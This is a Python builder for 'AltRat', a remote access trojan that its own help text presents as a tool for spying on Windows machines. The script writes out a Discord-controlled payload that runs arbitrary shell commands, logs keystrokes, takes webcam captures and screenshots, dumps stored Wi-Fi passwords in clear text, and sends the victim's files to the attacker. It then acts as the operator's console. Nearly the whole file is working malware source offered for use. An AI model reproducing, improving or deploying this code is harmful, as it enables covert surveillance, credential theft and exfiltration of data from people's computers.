from discord_webhook import DiscordWebhook
import time
import sys
import os
from colorama import init, Fore, Style
import discord
import asyncio
from discord.ext import commands

init()

login = """
                    ..-=**#*****=:..            
                   :%%-..... ......=%#:          
                .:*=                 .**.        
                :#:                    :%.              
               .@:..                  ..=%.             
               :%.*:                  =+.%.      
               .@.*-                  =+.%.                    
               .*+-*                 :#-+#.      
                .#+#.*@@@@%:  -@@@@@*:**#.        
           ...  ..**.@@@@@#.  :#@@@@@:++.   ...        
          .%-#=. .+- -@@@#. -. .%@@@: =+. .*+-*.                AltRat By AltWolf
         .=* .++-.+=   .. .%@%*. ... .+=.-*=..*-.                  Team AltSad 
        .++.   .:+#@%*-. .+@@%@-. .=*%@#=:.   .*+                 Version V6.0.2
        ..:---#%=...:%+%* .:..:. +%+@:...+%*---:.        
                .-##-+*:@::-::-::%:#+=##-.                    Press Enter to continue
                   ..*+*@+*@.-%+*%+*+..                
                 .+@*++ -#=% :%+%-.#-*@+.        
           :%###*-..:=%=.        .+%-...-*####:  
           .**. .:**=:.-*#+====*#+:.:=**:  :**.  
            .==.#+.                     *#.+=    
             :*#:                        -#*.....
        """

print(Fore.MAGENTA + login + Style.RESET_ALL)

green = "\033[92m"
red = "\033[91m"
white = "\033[97m"
reset = "\033[0m"

            
def Title(text):
    print(f"{white}{text}{reset}")

                
def Slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.02)  
    print()

            
def gradient():
    for i in range(256):
        color = f"\033[38;5;{i}m"  
        time.sleep(0.05)  
    print()  

                

menu_choice = input(f""" {Fore.BLACK}  

    {Fore.MAGENTA}=[ Altool v6.0.2-dev{Fore.WHITE}            ]
            
{Fore.MAGENTA}┌───({Fore.WHITE}AltWolf@altool{Fore.MAGENTA})─[{Fore.WHITE}~/1{Fore.MAGENTA}]
└──$  {Fore.WHITE}""")
            

if menu_choice =="Show_Help":
        print(help)
        time.sleep(100)
        #idk

help_text = """
    What is this tool used for?
    ==========================

    This tool is a RAT used for spying  
    Created by AltSad, it only works for remotely controlling a Windows system  

    Version       Date         Created By Team AltSad
    ======================
    1.0.1      26/04/2024    By AltWolf & SadGx

    Command                     Description
    ======================      ======================
    !webcam                     Take a webcam capture that will be saved on your desktop
    !remote                     Take a screenshot of the device
    !wifi                       Turn off WiFi
    !sysinfo                    System information
    !cd                         Select a directory
    !get_mdp                    Get passwords
    !keylogger                  Record keystrokes
    !cmd                        Send commands via cmd
    !ipconfig                   Send PC information (IP)
    !get_mdp                    Send passwords of the network you are connected to (specify the network)
    !send                       Send files to the attacker
    !file                       Send file names from the victim to the attacker


    Altconsole
    ======================
"""
        

print(help_text)
input("press enter to create the AltRat file...")

            
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

                
file_path = os.path.join(desktop_path, "AltRat.py")

            
token = input("Bot token discord : ")

                
file_content = f"""
import discord
import subprocess
import os
import keyboard
import asyncio
import sys
import pyautogui
import cv2
import platform
import uuid
import socket
import requests
import os
import win32api
from datetime import datetime
from flask import Flask, send_from_directory
from threading import Thread

intents = discord.Intents.default()
intents.typing = False
client = discord.Client(intents=intents)

TOKEN = '{token}'

app = Flask(__name__)
IMAGE_FOLDER = 'images'
if not os.path.exists(IMAGE_FOLDER):
    os.makedirs(IMAGE_FOLDER)

@app.route('/images/<filename>')
def get_image(filename):
    return send_from_directory(IMAGE_FOLDER, filename)

def run_flask_app():
    app.run(host='0.0.0.0', port=5000)

thread = Thread(target=run_flask_app)
thread.daemon = True
thread.start()

async def process_command(message):
    if message.content.startswith('!salut'):
        await message.channel.send('Salut!')
    elif message.content.startswith('!bonjour'):
        await message.channel.send('Bonjour!')
    elif message.content.startswith('!ipconfig'):
        process = subprocess.Popen(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, _ = process.communicate()
        await message.channel.send(output.decode('latin-1'))  
    elif message.content.startswith('!wifi'):
        command = 'netsh wlan show profile'
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, _ = process.communicate()
        await message.channel.send(output.decode('latin-1'))  
    elif message.content.startswith('!get_mdp'):
        wifi_name = message.content.split("!get_mdp ", 1)[1].strip()
        if wifi_name:
            command = f'netsh wlan show profile name="{{wifi_name}}" key=clear'
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output, _ = process.communicate()
            await message.channel.send(output.decode('latin-1'))  
        else:
            await message.channel.send("Veuillez fournir le nom du Wi-Fi apres la commande !wifi_mdp.")
    elif message.content.startswith('!cmd'):
        cmd = message.content.split('!cmd ', 1)[1].strip()
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, _ = process.communicate()
        await message.channel.send(output.decode('latin-1'))  
    elif message.content.startswith('!keylogger'):
        await message.channel.send("Keylogger active. Enregistrement du clavier pendant 10 minutes...")
        recording_time = 600
        keyboard.start_recording()
        await asyncio.sleep(recording_time)
        key_logs = keyboard.stop_recording()
        log_content = ''.join(str(log) for log in key_logs)
        await message.channel.send(f"**Keylogger Logs:**```{{log_content}}```")
    elif message.content.startswith('!ls'):
        try:
            files = os.listdir('.')
            if len(files) > 4000:
                with open('files.txt', 'w') as f:
                    f.write(''.join(files))
                with open('files.txt', 'rb') as f:
                    await message.channel.send(file=discord.File(f, 'files.txt'))
                os.remove('files.txt')
            else:
                await message.channel.send(''.join(files))
        except Exception as e:
            await message.channel.send(f"Une erreur est survenue : {{e}}")
    elif message.content.startswith('!cd'):
        try:
            directory = message.content.split('!cd ', 1)[1].strip()
            os.chdir(directory)
            await message.channel.send(f'Changement de repertoire vers [ {{os.getcwd()}} ]')
        except FileNotFoundError:
            await message.channel.send('Repertoire introuvable ')
    elif message.content.startswith('!send'):
        filename = message.content.split("!send ", 1)[1].strip()
        if filename:
            download_dir = os.path.join(os.path.expanduser('~'), 'Downloads')
            if os.path.exists(os.path.join(download_dir, filename)):
                file_path = os.path.join(download_dir, filename)
            else:
                desktop_dir = os.path.join(os.path.expanduser('~'), 'Desktop')
                if os.path.exists(os.path.join(desktop_dir, filename)):
                    file_path = os.path.join(desktop_dir, filename)
                else:
                    documents_dir = os.path.join(os.path.expanduser('~'), 'Documents')
                    if os.path.exists(os.path.join(documents_dir, filename)):
                        file_path = os.path.join(documents_dir, filename)
                    else:
                        await message.channel.send(f"Le fichier '{{filename}}' n'existe pas dans les telechargements, sur le bureau ni dans les documents.")
                        return
            with open(file_path, 'rb') as file:
                file_to_send = discord.File(file, filename=filename)
                await message.channel.send(file=file_to_send)
        else:
            await message.channel.send("Veuillez fournir le nom du fichier aprs la commande !send.")
    elif message.content.startswith('!webcam'):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            filename = f"webcam_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png"
            filepath = os.path.join(IMAGE_FOLDER, filename)
            cv2.imwrite(filepath, frame)
            image_url = f"http://{{socket.gethostbyname(socket.gethostname())}}:5000/images/{{filename}}"
            await message.channel.send(f"Image capturee : [Cliquez ici pour voir l'image]({{image_url}})")
        else:
            await message.channel.send("Erreur lors de la capture de l'image de la webcam.")
    elif message.content.startswith('!remote'):
        screenshot = pyautogui.screenshot()
        filename = f"screenshot_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        screenshot.save(filepath)
        image_url = f"http://{{socket.gethostbyname(socket.gethostname())}}:5000/images/{{filename}}"
        await message.channel.send(f"Capture d'ecran prise : [Cliquez ici pour voir l'image]({{image_url}})")
    elif message.content.startswith('!stop'):
        await message.channel.send("Arret du bot...")
        await client.close()
        sys.exit()
    elif message.content.startswith('!file'):
        try:
            files = []
            directories_to_search = [
                os.path.join(os.path.expanduser('~'), 'Desktop'),
                os.path.join(os.path.expanduser('~'), 'Documents'),
                os.path.join(os.path.expanduser('~'), 'Downloads')
            ]
            for directory in directories_to_search:
                files.extend([f"{{directory}}: {{file}}" for file in os.listdir(directory)])
            if files:
                await message.channel.send("".join(files))
            else:
                await message.channel.send("Aucun fichier trouve dans les repertoires specifies.")
        except Exception as e:
            await message.channel.send(f"Une erreur est survenue : {{e}}")
    elif message.content.startswith('!sysinfo'):
        system_info = {{
            "System": platform.system(),
            "Node Name": platform.node(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Python Version": platform.python_version(),
            "MAC Address": ':'.join(['{{:02x}}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]),
            "Public IP": requests.get('https://api.ipify.org').text,
            "IPv4 Address": socket.gethostbyname(socket.gethostname()),
            "PC Name": socket.gethostname(),
            "User": os.getlogin(),
            "Owner": win32api.GetUserName(),
        }}
        info_str = "".join([f"{{key}}: {{value}}" for key, value in system_info.items()])
        await message.channel.send(f"```{{info_str}}```")

async def listen_to_discord():
    await client.wait_until_ready()
    print('Bot connecte en tant que', client.user)
    while not client.is_closed():
        try:
            message = await client.wait_for('message')
            await process_command(message)
        except Exception as e:
            print('Une erreur est survenue :', e)

@client.event
async def on_ready():
    print('Connecte a Discord!')
    await listen_to_discord()

client.run(TOKEN)
"""


with open(file_path, "w") as file:
    file.write(file_content)

print(f"AltRat here : {file_path}")

            
command = input("Wait until the AltRat file is running before connecting, otherwise it won’t work (connect only once it’s running)")

                
channel_id = input("Veuillez entrer l'ID du canal: ")

async def send_command_to_bot(command):
    await bot_channel.send(command)

async def receive_response():
    try:
        response = await bot.wait_for('message', timeout=30)
        print(response.content)
    except asyncio.TimeoutError:
        print("La réponse du bot a pris trop de temps.")

async def main():
    while True:
        command = input("Entrez une commande (ou 'exit' pour quitter) : ")

        if command.lower() == 'exit':
            break
                        
        await send_command_to_bot(command)
        await receive_response()

intents = discord.Intents.default()
intents.messages = True
bot = discord.Client(intents=intents)

@bot.event
async def on_ready():
    print('Bot connecté en tant que', bot.user)

    global bot_channel
    bot_channel = bot.get_channel(int(channel_id))
                    
    if bot_channel is None:
        print("Le canal spécifié est introuvable.")
        return
                    
    print('Connexion établie avec Discord et canal trouvé !')
    await main()

            
bot.run(token)

            
command = input("Appuyez sur Entrée pour lancer la connexion... ")